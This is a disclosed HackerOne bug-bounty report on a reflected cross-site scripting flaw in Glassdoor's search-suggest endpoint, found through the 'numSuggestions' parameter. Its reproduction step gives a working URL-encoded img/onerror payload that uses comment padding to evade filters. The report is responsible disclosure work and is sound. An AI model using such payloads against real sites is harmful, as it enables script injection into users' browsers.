# Reflected XSS at https://www.glassdoor.com/ via the 'numSuggestions' parameter

## Report Details
- **Report ID**: 1042486
- **URL**: https://hackerone.com/reports/1042486
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-11-24T14:25:35.399Z
- **Disclosed**: 2020-12-14T15:27:55.885Z

## Reporter
- **Username**: l0cpd
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
Hi there,
I have found the xss vulnerability at: https://www.glassdoor.com/ via parameter: `numSuggestions`

**Summary:** 
Affected Parameter: `numSuggestions`

**Browsers tested:** Firefox, Chrome, Edge (latest version)

## Steps To Reproduce:
Go to: `https://www.glassdoor.com/searchsuggest/typeahead?numSuggestions=8rk3s6%22%3Cimg/**/src%3D%22x%22/**/onx%3D%22%22/**/onerror%3D%22alert%60l0cpd%60%22%3Ef9y60`
{F1092213}

## Supporting Material/References (screenshots, logs, videos):
{F1092214} 


Regards,
@l0cpd

## Impact

The attacker can execute JS code.

## Attachments
- Trigger.PNG
- XSS_via_numSuggestions.mp4
